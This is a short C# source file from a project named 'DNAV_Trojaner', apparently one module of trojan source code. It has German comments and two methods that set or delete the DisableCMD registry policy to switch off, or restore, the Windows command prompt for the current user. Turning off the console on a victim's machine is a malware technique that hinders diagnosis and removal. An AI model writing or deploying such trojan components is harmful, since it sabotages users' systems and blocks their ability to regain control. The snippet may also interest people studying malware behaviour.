﻿using Microsoft.Win32;

namespace DNAV_Trojaner
{
    public class Cmd
    {
        /// <summary>
        /// Aktiviert die Konsole
        /// </summary>
        public static void Enable()
        {
            RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            if (cmd.GetValue("DisableCMD") != null)
            {
                cmd.DeleteValue("DisableCMD");
            }
        }
        /// <summary>
        /// Deaktiviert die Konsole
        /// </summary>
        public static void Disbable()
        {
            RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            cmd.SetValue("DisableCMD", 0x00000001, RegistryValueKind.DWord);
            cmd.Close();
        }
    }
}
